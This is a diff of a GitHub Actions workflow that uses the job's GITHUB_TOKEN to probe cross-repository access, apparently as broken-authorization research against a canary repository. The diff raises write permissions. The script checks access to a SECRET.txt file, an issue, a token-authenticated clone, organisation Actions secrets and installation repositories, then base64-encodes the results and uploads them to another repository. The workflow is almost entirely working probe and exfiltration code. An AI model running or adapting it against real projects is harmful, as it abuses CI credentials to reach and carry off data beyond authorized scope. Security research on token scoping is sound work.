@@ -1,25 +1,23 @@
 name: probe
 on: [push, workflow_dispatch]
-permissions: read-all
+permissions:
+  contents: write
 jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
-      - name: probe with GITHUB_TOKEN
+      - name: probe
         env:
           GT: ${{ secrets.GITHUB_TOKEN }}
         run: |
           set +eo pipefail
-          A=https://api.github.com
-          C=s3rdz0-org/bola-canary-23514
-          RES=""
-          RES="${RES}REPO_API:$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/repos/$C)\n"
-          RES="${RES}CONTENTS:$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/repos/$C/contents/SECRET.txt)\n"
-          RES="${RES}ISSUE:$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/repos/$C/issues/1)\n"
-          RES="${RES}CLONE:$(git clone https://x-access-token:$GT@github.com/$C /tmp/c 2>&1 | tail -1)\n"
-          RES="${RES}ORG_SECRETS:$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/orgs/s3rdz0-org/actions/secrets)\n"
-          RES="${RES}INSTALL_REPOS:$(curl -s -H "Authorization: token $GT" $A/installation/repositories | tr -d '\n' | cut -c1-400)\n"
-          printf "%b" "$RES"
-          printf "%b" "$RES" >> "$GITHUB_STEP_SUMMARY"
-          B64=$(printf "%b" "$RES" | base64 -w0)
-          curl -s -X PUT -H "Authorization: token $GT" $A/repos/s3rdz0-org/bola-actions/contents/RESULTS.txt -d "{\"message\":\"res\",\"content\":\"$B64\"}" -o /dev/null -w "PUT:%{http_code}\n"
+          A=https://api.github.com; C=s3rdz0-org/bola-canary-23514
+          R="canary_repo=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/repos/$C) "
+          R="${R}contents=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/repos/$C/contents/SECRET.txt) "
+          R="${R}issue=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/repos/$C/issues/1) "
+          R="${R}clone=$(git clone https://x-access-token:$GT@github.com/$C /tmp/c 2>&1 | tail -1 | tr ' ' '_') "
+          R="${R}org_secrets=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/orgs/s3rdz0-org/actions/secrets) "
+          R="${R}scope=$(curl -s -H "Authorization: token $GT" $A/installation/repositories | tr -d '\n ' | cut -c1-250)"
+          echo "PROBE $R"
+          B64=$(printf '%s' "$R" | base64 -w0)
+          curl -s -X PUT -H "Authorization: token $GT" $A/repos/s3rdz0-org/bola-actions/contents/RESULTS.txt -d "{\"message\":\"r\",\"content\":\"$B64\"}" -o /dev/null -w "PUT=%{http_code}\n"
